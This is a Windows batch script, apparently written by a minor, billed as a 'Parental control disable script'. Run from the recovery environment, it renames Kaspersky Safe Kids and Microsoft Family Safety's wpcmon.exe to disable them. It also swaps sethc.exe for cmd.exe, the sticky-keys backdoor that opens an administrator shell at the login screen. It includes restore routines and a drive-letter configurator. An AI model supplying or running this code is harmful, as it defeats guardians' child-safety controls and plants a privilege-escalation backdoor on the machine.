@echo off
cls
SETLOCAL ENABLEDELAYEDEXPANSION
goto loadconfig

:stopeed
tasklist /FI "imagename eq explorer.exe" | find "explorer.exe" >nul
IF !errorlevel! == 0 (
    echo It seems like you're in the normal windows session, restarting to winRE
    SET /P restartqueue="Wanna restart to winre?(Y/N) : "
    if "%restartqueue%" == "Y" (
        shutdown /r /o /t 00
    ) else (
        echo You have to do it manualy!
        goto finish
    )
) ELSE (
    goto aroumenting
)

:aroumenting
if "%2" == "--debugon" (
    @echo on
    set debug=true
    goto debugon
) else (
    set debug=nottrue
    goto stillcheckanyway
)

:stillcheckanyway
if "%1" == "--disablekaspersky" ( goto dokas )
if "%1" == "--disablemicrosoftfamilysafely" ( goto domic )
if "%1" == "--disableboth" ( goto doboth )
if "%1" == "--enablekaspersky" ( goto undokas )
if "%1" == "--enablemicrosoftfamilysafely" ( goto undomic )
if "%1" == "--enableboth" ( goto undoboth )
goto printhelp

:doboth
cd "Program Files (x86)\Kaspersky Lab\"
rename "Kaspersky Safe Kids 23.0" "Kaspersky Fuck Kids"
cd ..\..\..
cd Windows\System32
ren sethc.exe sethc1.exe
copy cmd.exe sethc.exe
ren wpcmon.exe wpcmon1.exe
cd ..\..
goto finish

:undoboth
cd "Program Files (x86)\Kaspersky Lab\"
rename "Kaspersky Fuck Kids" "Kaspersky Safe Kids 23.0"
cd ..\..\..
cd Windows\System32
del sethc.exe
ren sethc1.exe sethc.exe
ren wpcmon1.exe wpcmon.exe
goto finish

:dokas
cd "Program Files (x86)\Kaspersky Lab\"
rename "Kaspersky Safe Kids 23.0" "Kaspersky Fuck Kids"
cd ..\..\..
goto finish

:domic
cd Windows\System32
ren sethc.exe sethc1.exe
copy cmd.exe sethc.exe
ren wpcmon.exe wpcmon1.exe
cd ..\..
goto finish

:undokas
cd "Program Files (x86)\Kaspersky Lab\"
rename "Kaspersky Fuck Kids" "Kaspersky Safe Kids 23.0"
cd ..\..\..
goto finish

:undomic
cd Windows\System32
del sethc.exe
ren sethc1.exe sethc.exe
ren wpcmon1.exe wpcmon.exe
goto finish

:showreadme
if exist readme.md (
    notepad readme.md
) else (
    echo It looks like you didn't download the readme file
)
goto finish

:printhelp
echo -------------------------------
echo Parental control disable script
echo -------------------------------
echo What do u want to do?
echo 1 - (disable)
echo 2 - (enable)
set /p ursinput=
goto helpstep2

:finish
CD %WINDIR%
if "%debug%" == "nottrue" (
    cls
)
@echo on
endlocal
cls
echo This is the end!
echo Bye Bye
echo Hope ur parents dont find me
goto :eof

:loadconfig
:: Define the path to your config file
set "CONFIG_FILE=config.txt"
:: Check if the config file exists
if not exist "%CONFIG_FILE%" (
    echo Calling the "configurator"
    goto configurator
)
echo Loading configuration from "%CONFIG_FILE%"...
:: Use FOR /F to read the file line by line
:: 'delims=' ensures the entire line is read into %%a	
:: 'tokens=1,*' splits the line at the first '='
for /f "usebackq tokens=1,* delims==" %%a in ("%CONFIG_FILE%") do (
    if not "%%a" == "" (
        if not "%%a" == "#" (
            :: Trim leading and trailing spaces from the variable name (%%a)
            set "var_name=%%a"
            :: Trim leading spaces from the value (%%b)
            set "var_value=%%b"

            :: Set the actual environment variable
            set "!var_name!=!var_value!"
            echo Set variable: !var_name! = !var_value!
        )
    )
)
echo.
echo Configuration loaded successfully.
echo.
goto aroumenting

:helpstep2
if "%debug%" == "nottrue" (  
    @echo off
    cls
)
echo -------------------------------
echo Parental control disable script
echo -------------------------------
echo Select target : 
echo 1 - (Kaspersky Safe Kids)
echo 2 - (Microsoft Family Safety(u can get admin too))
echo 3 - (Both)
set /p ursinput2=
if %ursinput% == 1 (
    if %ursinput2% == 1 ( goto dokas )
    if %ursinput2% == 2 ( goto domic )
    if %ursinput2% == 3 ( goto doboth )
) else (
    if %ursinput% == 2 (
    if %ursinput2% == 1 ( goto undokas )
    if %ursinput2% == 2 ( goto undomic )
    if %ursinput2% == 3 ( goto undoboth )
    ) else ( 
	echo There's something wrong here!
	goto finish
    )
)

:configurator
echo -------------------------------
echo Parental control disable script
echo -------------------------------
echo ------Configurator------
echo Opening notepad
start notepad
echo U can find your disks/partitions in
echo File -^> Save -^> This PC
echo Please find any partion/disk with Windows folder in it
echo WARNING : ONLY THE DISK LETTER
set /p configdisk=Enter your disk name(C,D,...) : 
echo windirtoo=%configdisk% > config.txt
goto loadconfig